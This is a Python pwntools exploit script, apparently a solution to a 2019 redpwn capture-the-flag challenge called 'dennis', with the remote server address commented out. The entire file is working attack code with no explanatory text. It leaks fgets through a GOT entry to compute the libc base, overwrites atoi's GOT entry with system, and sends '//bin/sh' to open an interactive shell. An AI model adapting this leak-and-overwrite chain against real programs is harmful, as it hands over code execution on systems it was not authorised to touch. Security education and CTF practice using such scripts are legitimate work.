import binascii
from pwn import *

libc = ELF('./libc.so.6')

def alloc(size):
	r.sendlineafter(':', '1')
	r.sendlineafter(':', str(size))

def show(size):
	r.sendlineafter(':', '2')
	r.sendlineafter(':', str(size))

def copy():
	r.sendlineafter(':', '3')

def gets(content):
	r.sendlineafter(':', '4')
	r.sendlineafter(':', content)

def delete():
	r.sendlineafter(':', '5')

def leak(content):
	r.sendlineafter(':', '6')
	r.sendlineafter('repeat', content)


r = process('./dennis')
#r = remote('chall.2019.redpwn.net', 4006)

fgets_got = 0x804b01c
puts_plt = 0x8048556
spm = 0x804b050

alloc(0x30)
gets(flat(fgets_got, spm))
copy()
show(0x5)
libc_base = u32(r.recvn(5)[-4:]) - libc.symbols['fgets']
system = libc_base + libc.symbols['system']
print "system @ ", hex(system)

atoi_got = 0x804b03c
alloc(0x30)
gets(flat(system, atoi_got))
copy()

r.sendlineafter(':', '1')
r.sendlineafter(':', '//bin/sh')
r.interactive()